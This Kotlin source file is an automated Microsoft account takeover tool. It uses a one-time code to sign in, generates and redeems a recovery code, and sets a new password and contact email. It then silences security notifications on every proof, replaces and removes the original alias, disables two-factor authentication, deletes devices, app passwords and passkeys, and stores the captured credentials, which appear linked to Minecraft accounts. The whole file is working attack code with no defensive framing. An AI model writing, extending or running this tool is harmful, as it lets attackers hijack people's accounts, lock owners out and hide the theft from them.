package microsoft.recovery

import database.model.RecoveredAccount
import database.repository.AccountRepository
import io.ktor.client.HttpClient
import io.ktor.client.call.body
import io.ktor.client.engine.HttpClientEngine
import io.ktor.client.plugins.cookies.AcceptAllCookiesStorage
import io.ktor.client.plugins.cookies.CookiesStorage
import io.ktor.client.request.forms.submitForm
import io.ktor.client.request.get
import io.ktor.client.request.header
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.client.statement.bodyAsText
import io.ktor.http.ContentType
import io.ktor.http.Cookie
import io.ktor.http.HttpHeaders
import io.ktor.http.Url
import io.ktor.http.contentType
import io.ktor.http.isSuccess
import io.ktor.http.parameters
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay
import microsoft.recovery.alias.AliasClient
import microsoft.recovery.model.GenerateRecoveryCodeRequest
import microsoft.recovery.model.GenerateRecoveryCodeResponse
import microsoft.recovery.model.GenericCanaryResponse
import microsoft.recovery.model.GetCredentialTypeRequest
import microsoft.recovery.model.GetCredentialTypeResponse
import microsoft.recovery.model.GetOneTimeCodeResponse
import microsoft.recovery.model.MakePrimaryRequest
import microsoft.recovery.model.NotificationProofDetail
import microsoft.recovery.model.RecoverUserRequest
import microsoft.recovery.model.RecoverUserResponse
import microsoft.recovery.model.RecoveryResult
import microsoft.recovery.model.RecoveryStage
import microsoft.recovery.model.SecurityCleanupRequest
import microsoft.recovery.model.SetUserNotificationStateRequest
import microsoft.recovery.model.VerifyRecoveryCodeRequest
import microsoft.recovery.model.VerifyRecoveryCodeResponse
import microsoft.recovery.util.MicrosoftHttpClientFactory
import microsoft.recovery.util.RecoveryParsers
import org.slf4j.LoggerFactory
import java.security.SecureRandom

class RecoveryService(
    private val clientEngine: HttpClientEngine? = null,
    private val stageDelayMs: Long = 1000L,
    private val accountRepository: AccountRepository? = null,
    private val aliasClient: AliasClient? = null,
) : AutoCloseable {

    private val logger = LoggerFactory.getLogger(RecoveryService::class.java)
    private val secureRandom = SecureRandom()

    override fun close() {
    }

    suspend fun runLifecycle(
        email: String,
        otpProvider: suspend () -> String,
        newPassword: String? = null,
        newEmail: String? = null,
    ): RecoveryResult {
        if (email.isBlank()) {
            return RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, "Email cannot be blank")
        }

        val targetPassword = if (!newPassword.isNullOrBlank()) {
            newPassword
        } else {
            val length = secureRandom.nextInt(5) + 12
            RecoveryParsers.generateRandomPassword(length)
        }

        val effectiveNewEmail = newEmail?.trim()
            ?: aliasClient?.generateRandomAlias()
            ?: "recov_${RecoveryParsers.generateUaid().take(8)}@outlook.com"

        val cookieStorage = AcceptAllCookiesStorage()
        val client = if (clientEngine != null) {
            MicrosoftHttpClientFactory.create(storage = cookieStorage, engine = clientEngine)
        } else {
            MicrosoftHttpClientFactory.create(storage = cookieStorage)
        }

        return try {
            executeLifecycle(
                client = client,
                cookieStorage = cookieStorage,
                email = email.trim(),
                otpProvider = otpProvider,
                newPassword = targetPassword,
                newEmail = effectiveNewEmail,
            )
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            logger.error("Unhandled exception during lifecycle automation: {}", e.message, e)
            RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = "Lifecycle failed with unexpected exception: ${e.message}",
                cause = e,
            )
        } finally {
            client.close()
        }
    }

    private suspend fun executeLifecycle(
        client: HttpClient,
        cookieStorage: CookiesStorage,
        email: String,
        otpProvider: suspend () -> String,
        newPassword: String,
        newEmail: String,
    ): RecoveryResult {
        val uaid = RecoveryParsers.generateUaid()

        val loginResponse = client.get("https://login.live.com/login.srf")
        if (!loginResponse.status.isSuccess()) {
            return RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = "Failed to fetch login page: HTTP ${loginResponse.status.value}",
            )
        }

        val loginHtml = loginResponse.bodyAsText()
        val initialPpft = RecoveryParsers.extractPpft(loginHtml, MicrosoftHttpClientFactory.json)
            ?: return RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = "Failed to extract initial PPFT from login page",
            )

        val credResponse = client.post("https://login.live.com/GetCredentialType.srf") {
            contentType(ContentType.Application.Json)
            header("Referer", "https://login.live.com/login.srf")
            setBody(
                GetCredentialTypeRequest(
                    username = email,
                    flowToken = initialPpft,
                    isUcuxLoginForm = true,
                    isCookieBannerShown = false,
                    checkPhones = true,
                )
            )
        }

        if (!credResponse.status.isSuccess()) {
            return RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = "Credential check failed: HTTP ${credResponse.status.value}",
            )
        }

        val credData = credResponse.body<GetCredentialTypeResponse>()
        when (credData.ifExistsResult) {
            0 -> {}
            1 -> return RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = "Account does not exist (IfExistsResult=1)",
                errorCode = "1",
            )
            5 -> return RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = "Account is throttled or captcha blocked (IfExistsResult=5)",
                errorCode = "5",
            )
            else -> return RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = "Unexpected IfExistsResult=${credData.ifExistsResult}",
                errorCode = credData.ifExistsResult?.toString(),
            )
        }

        val proofs = credData.credentials?.otcLoginEligibleProofs.orEmpty()
        val primaryProof = proofs.firstOrNull()
            ?: return RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = "No OTC eligible proofs available for this account",
            )

        val proofId = primaryProof.data
            ?: return RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = "Primary proof identifier is missing",
            )

        val proofChannel = if (primaryProof.type == 2) "SMS" else "Email"

        val otcResponse = client.submitForm(
            url = "https://login.live.com/GetOneTimeCode.srf",
            formParameters = parameters {
                append("login", email)
                append("flowtoken", initialPpft)
                append("purpose", "eOTT_OtcLogin")
                append("channel", proofChannel)
                append("AltEmailE", proofId)
            },
        )

        val otcData = runCatching { otcResponse.body<GetOneTimeCodeResponse>() }.getOrNull()
        val postPpft = otcData?.flowToken ?: initialPpft
        if (postPpft.isBlank()) {
            return RecoveryResult.Failure(
                stage = RecoveryStage.OTP_DISPATCH,
                message = "GetOneTimeCode returned invalid flow token: State=${otcData?.state}, Error=${otcData?.error}",
                errorCode = otcData?.state?.toString(),
            )
        }

        val otp = otpProvider().trim()
        if (otp.isBlank()) {
            return RecoveryResult.Failure(
                stage = RecoveryStage.SESSION_ESTABLISHMENT,
                message = "Provided OTP code is blank",
            )
        }

        val postResponse = client.submitForm(
            url = "https://login.live.com/ppsecure/post.srf",
            formParameters = parameters {
                append("login", email)
                append("loginfmt", email)
                append("type", "27")
                append("SentProofIDE", proofId)
                append("otc", otp)
                append("PPFT", postPpft)
                append("LoginOptions", "3")
            },
        )

        val loginCookies = cookieStorage.get(Url("https://login.live.com"))
        val msaAuthCookie = loginCookies.firstOrNull { it.name == "__Host-MSAAUTH" }
            ?: postResponse.headers.getAll(HttpHeaders.SetCookie)?.firstOrNull { it.contains("__Host-MSAAUTH") }?.let {
                val value = it.substringAfter("__Host-MSAAUTH=").substringBefore(";")
                Cookie(name = "__Host-MSAAUTH", value = value, domain = "login.live.com", path = "/", secure = true)
            }

        if (msaAuthCookie == null) {
            return RecoveryResult.Failure(
                stage = RecoveryStage.SESSION_ESTABLISHMENT,
                message = "Failed to establish authenticated session: __Host-MSAAUTH cookie not found",
            )
        }

        cookieStorage.addCookie(
            Url("https://account.live.com"),
            Cookie(
                name = "__Host-MSAAUTH",
                value = msaAuthCookie.value,
                domain = "account.live.com",
                path = "/",
                secure = true,
            ),
        )

        val polishUrl = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=21&rver=7.5.2156.0&wp=SA_20MIN&wreply=https://account.live.com/proofs/Add?apt=2&uaid=$uaid&lc=1033&id=38936&mkt=en-US"
        val polishResponse = client.get(polishUrl)
        val polishHtml = polishResponse.bodyAsText()
        val tokenT = RecoveryParsers.extractTokenT(polishHtml)
            ?: return RecoveryResult.Failure(
                stage = RecoveryStage.SESSION_STABILIZATION,
                message = "Failed to extract token t from session stabilization step",
            )

        val addProofResponse = client.submitForm(
            url = "https://account.live.com/proofs/Add?apt=2&wa=wsignin1.0",
            formParameters = parameters {
                append("t", tokenT)
            },
        )

        val accountCookies = cookieStorage.get(Url("https://account.live.com"))
        val hasAmrp = accountCookies.any { it.name == "AMRPSSecAuth" }
            || addProofResponse.headers.getAll(HttpHeaders.SetCookie).orEmpty().any { it.contains("AMRPSSecAuth") }
        val hasAmsc = accountCookies.any { it.name == "amsc" }
            || addProofResponse.headers.getAll(HttpHeaders.SetCookie).orEmpty().any { it.contains("amsc") }

        if (!hasAmrp || !hasAmsc) {
            return RecoveryResult.Failure(
                stage = RecoveryStage.SESSION_STABILIZATION,
                message = "Missing AMRPSSecAuth or amsc cookies after session stabilization",
            )
        }

        val manageProofsResponse = client.get("https://account.live.com/proofs/manage/additional") {
            header("X-Requested-With", "XMLHttpRequest")
        }
        val manageProofsHtml = manageProofsResponse.bodyAsText()
        val proofsData = RecoveryParsers.extractManageProofsData(manageProofsHtml, MicrosoftHttpClientFactory.json)
            ?: return RecoveryResult.Failure(
                stage = RecoveryStage.PROOFS_ENUMERATION,
                message = "Failed to extract encryptedNetId or apiCanary from additional proofs page",
            )

        var activeCanary = proofsData.apiCanary
        val encryptedNetId = proofsData.encryptedNetId

        val generateRecoveryResponse = client.post("https://account.live.com/API/Proofs/GenerateRecoveryCode") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            header("x-ms-apiVersion", "2")
            header("x-ms-apiTransport", "xhr")
            setBody(GenerateRecoveryCodeRequest(encryptedNetId = encryptedNetId))
        }

        val genCodeData = runCatching { generateRecoveryResponse.body<GenerateRecoveryCodeResponse>() }.getOrNull()
        val initialRecoveryCode = genCodeData?.recoveryCode
        if (initialRecoveryCode.isNullOrBlank()) {
            return RecoveryResult.Failure(
                stage = RecoveryStage.RECOVERY_CODE_GENERATION,
                message = "Failed to generate initial recovery code: ${genCodeData?.error?.message ?: generateRecoveryResponse.bodyAsText()}",
                errorCode = genCodeData?.error?.code,
            )
        }
        if (!genCodeData.apiCanary.isNullOrBlank()) {
            activeCanary = genCodeData.apiCanary
        }

        val resetPageResponse = client.get("https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=$email")
        val resetHtml = resetPageResponse.bodyAsText()
        val resetData = RecoveryParsers.extractResetPasswordData(resetHtml, MicrosoftHttpClientFactory.json)
            ?: return RecoveryResult.Failure(
                stage = RecoveryStage.PASSWORD_ROTATION,
                message = "Failed to extract sRecoveryToken or reset canary from reset password page",
            )

        val verifyCodeResponse = client.post("https://account.live.com/API/Recovery/VerifyRecoveryCode") {
            contentType(ContentType.Application.Json)
            header("canary", resetData.apiCanary)
            setBody(
                VerifyRecoveryCodeRequest(
                    recoveryCode = initialRecoveryCode,
                    code = initialRecoveryCode,
                    token = resetData.sRecoveryToken,
                )
            )
        }

        val verifyData = runCatching { verifyCodeResponse.body<VerifyRecoveryCodeResponse>() }.getOrNull()
        val verificationGrantToken = verifyData?.token
        if (verificationGrantToken.isNullOrBlank()) {
            return RecoveryResult.Failure(
                stage = RecoveryStage.PASSWORD_ROTATION,
                message = "Failed to verify recovery code: ${verifyData?.error?.message ?: verifyCodeResponse.bodyAsText()}",
                errorCode = verifyData?.error?.code,
            )
        }
        if (!verifyData.apiCanary.isNullOrBlank()) {
            activeCanary = verifyData.apiCanary
        }

        val recoverUserResponse = client.post("https://account.live.com/API/Recovery/RecoverUser") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            setBody(
                RecoverUserRequest(
                    contactEmail = newEmail,
                    password = newPassword,
                    token = verificationGrantToken,
                )
            )
        }

        val recoverUserData = runCatching { recoverUserResponse.body<RecoverUserResponse>() }.getOrNull()
        val finalRecoveryCode = recoverUserData?.recoveryCode
        if (finalRecoveryCode.isNullOrBlank()) {
            return RecoveryResult.Failure(
                stage = RecoveryStage.PASSWORD_ROTATION,
                message = "Failed to recover user credentials: ${recoverUserData?.error?.message ?: recoverUserResponse.bodyAsText()}",
                errorCode = recoverUserData?.error?.code,
            )
        }
        if (!recoverUserData.apiCanary.isNullOrBlank()) {
            activeCanary = recoverUserData.apiCanary
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        val freshProofsResponse = client.get("https://account.live.com/proofs/manage/additional") {
            header("X-Requested-With", "XMLHttpRequest")
        }
        val freshProofsData = RecoveryParsers.extractManageProofsData(freshProofsResponse.bodyAsText(), MicrosoftHttpClientFactory.json)
        val emailProofs = freshProofsData?.emailProofs ?: proofsData.emailProofs
        val smsProofs = freshProofsData?.smsProofs ?: proofsData.smsProofs
        val passKeyIds = freshProofsData?.passKeyIds ?: proofsData.passKeyIds
        if (!freshProofsData?.apiCanary.isNullOrBlank()) {
            activeCanary = freshProofsData.apiCanary
        }

        var suppressedCount = 0
        val targetProofs = emailProofs + smsProofs
        for (proof in targetProofs) {
            val suppressionResponse = client.post("https://account.live.com/API/Proofs/SetUserNotificationState") {
                contentType(ContentType.Application.Json)
                header("canary", activeCanary)
                setBody(
                    SetUserNotificationStateRequest(
                        proofDetails = listOf(
                            NotificationProofDetail(
                                name = proof.name,
                                notificationEnabled = false,
                                type = proof.type,
                            )
                        ),
                        uaid = uaid,
                    )
                )
            }

            if (!suppressionResponse.status.isSuccess()) {
                return RecoveryResult.Failure(
                    stage = RecoveryStage.NOTIFICATION_SUPPRESSION,
                    message = "Notification suppression failed for proof ${proof.name}: HTTP ${suppressionResponse.status.value}",
                )
            }

            val canaryResponse = runCatching { suppressionResponse.body<GenericCanaryResponse>() }.getOrNull()
            if (!canaryResponse?.apiCanary.isNullOrBlank()) {
                activeCanary = canaryResponse.apiCanary
            }
            suppressedCount++

            if (stageDelayMs > 0) delay(stageDelayMs)
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        val targetAliasEmail: String
        if (aliasClient != null) {
            val aliasResult = aliasClient.rotateAlias(
                currentCanary = activeCanary,
                oldEmail = email,
                httpClient = client,
                customAlias = if (newEmail.endsWith("@qhuyy.tech")) newEmail else null,
            )
            targetAliasEmail = aliasResult.newEmail
            activeCanary = aliasResult.updatedCanary
        } else {
            val newAliasPrefix = newEmail.substringBefore("@")
            targetAliasEmail = "$newAliasPrefix@outlook.com"

            val addAliasResponse = client.submitForm(
                url = "https://account.live.com/AddAssocId",
                formParameters = parameters {
                    append("canary", activeCanary)
                    append("PostOption", "NONE")
                    append("SingleDomain", "outlook.com")
                    append("AddAssocIdOptions", "LIVE")
                    append("AssociatedIdLive", newAliasPrefix)
                },
            )
            if (!addAliasResponse.status.isSuccess()) {
                return RecoveryResult.Failure(
                    stage = RecoveryStage.ALIAS_ROTATION,
                    message = "AddAssocId failed: HTTP ${addAliasResponse.status.value}",
                )
            }

            if (stageDelayMs > 0) delay(stageDelayMs)

            val makePrimaryResponse = client.post("https://account.live.com/API/MakePrimary") {
                contentType(ContentType.Application.Json)
                header("canary", activeCanary)
                setBody(
                    MakePrimaryRequest(
                        aliasName = targetAliasEmail,
                        emailChecked = true,
                        removeOldPrimary = false,
                        uaid = uaid,
                    )
                )
            }

            if (!makePrimaryResponse.status.isSuccess()) {
                return RecoveryResult.Failure(
                    stage = RecoveryStage.ALIAS_ROTATION,
                    message = "MakePrimary request failed: HTTP ${makePrimaryResponse.status.value}",
                )
            }

            val makePrimaryData = runCatching { makePrimaryResponse.body<GenericCanaryResponse>() }.getOrNull()
            if (makePrimaryData?.error?.code != null) {
                return RecoveryResult.Failure(
                    stage = RecoveryStage.ALIAS_ROTATION,
                    message = "MakePrimary rejected: ${makePrimaryData.error.message ?: makePrimaryData.error.code}",
                    errorCode = makePrimaryData.error.code,
                )
            }
            if (!makePrimaryData?.apiCanary.isNullOrBlank()) {
                activeCanary = makePrimaryData.apiCanary
            }

            if (stageDelayMs > 0) delay(stageDelayMs)

            val removeAliasResponse = client.submitForm(
                url = "https://account.live.com/names/manage",
                formParameters = parameters {
                    append("canary", activeCanary)
                    append("action", "RemoveAlias")
                    append("aliasName", email)
                    append("displayName", email)
                },
            )
            if (!removeAliasResponse.status.isSuccess()) {
                return RecoveryResult.Failure(
                    stage = RecoveryStage.ALIAS_ROTATION,
                    message = "RemoveAlias failed: HTTP ${removeAliasResponse.status.value}",
                )
            }
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        val disableTfaResponse = client.post("https://account.live.com/API/Proofs/DisableTfa") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            header("X-Requested-With", "XMLHttpRequest")
            setBody(SecurityCleanupRequest(uaid = uaid))
        }
        val disableTfaData = runCatching { disableTfaResponse.body<GenericCanaryResponse>() }.getOrNull()
        if (!disableTfaData?.apiCanary.isNullOrBlank()) {
            activeCanary = disableTfaData.apiCanary
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        val deleteDevicesResponse = client.post("https://account.live.com/API/Proofs/DeleteDevices") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            header("X-Requested-With", "XMLHttpRequest")
            setBody(SecurityCleanupRequest(uaid = uaid))
        }
        val deleteDevicesData = runCatching { deleteDevicesResponse.body<GenericCanaryResponse>() }.getOrNull()
        if (!deleteDevicesData?.apiCanary.isNullOrBlank()) {
            activeCanary = deleteDevicesData.apiCanary
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        val deleteAppPasswordResponse = client.post("https://account.live.com/API/Proofs/DeleteAppPassword") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            header("X-Requested-With", "XMLHttpRequest")
            setBody(SecurityCleanupRequest(uaid = uaid))
        }
        val deleteAppPasswordData = runCatching { deleteAppPasswordResponse.body<GenericCanaryResponse>() }.getOrNull()
        if (!deleteAppPasswordData?.apiCanary.isNullOrBlank()) {
            activeCanary = deleteAppPasswordData.apiCanary
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        if (passKeyIds.isNotEmpty()) {
            for (keyId in passKeyIds) {
                val removePasskeyResponse = client.post("https://account.live.com/API/Proofs/RemovePasskey") {
                    contentType(ContentType.Application.Json)
                    header("canary", activeCanary)
                    header("X-Requested-With", "XMLHttpRequest")
                    setBody(SecurityCleanupRequest(passKeyId = keyId, uaid = uaid))
                }
                val removePasskeyData = runCatching { removePasskeyResponse.body<GenericCanaryResponse>() }.getOrNull()
                if (!removePasskeyData?.apiCanary.isNullOrBlank()) {
                    activeCanary = removePasskeyData.apiCanary
                }
                if (stageDelayMs > 0) delay(stageDelayMs)
            }
        } else {
            val removePasskeyResponse = client.post("https://account.live.com/API/Proofs/RemovePasskey") {
                contentType(ContentType.Application.Json)
                header("canary", activeCanary)
                header("X-Requested-With", "XMLHttpRequest")
                setBody(SecurityCleanupRequest(uaid = uaid))
            }
            val removePasskeyData = runCatching { removePasskeyResponse.body<GenericCanaryResponse>() }.getOrNull()
            if (!removePasskeyData?.apiCanary.isNullOrBlank()) {
                activeCanary = removePasskeyData.apiCanary
            }
        }

        if (accountRepository != null) {
            accountRepository.saveAccount(
                RecoveredAccount(
                    originalEmail = email,
                    currentPrimaryEmail = targetAliasEmail,
                    password = newPassword,
                    recoveryCode = finalRecoveryCode,
                    ownsMinecraft = false,
                ),
            )
        }

        return RecoveryResult.Success(
            originalEmail = email,
            newPrimaryEmail = targetAliasEmail,
            password = newPassword,
            initialRecoveryCode = initialRecoveryCode,
            finalRecoveryCode = finalRecoveryCode,
            suppressedProofsCount = suppressedCount,
        )
    }
}
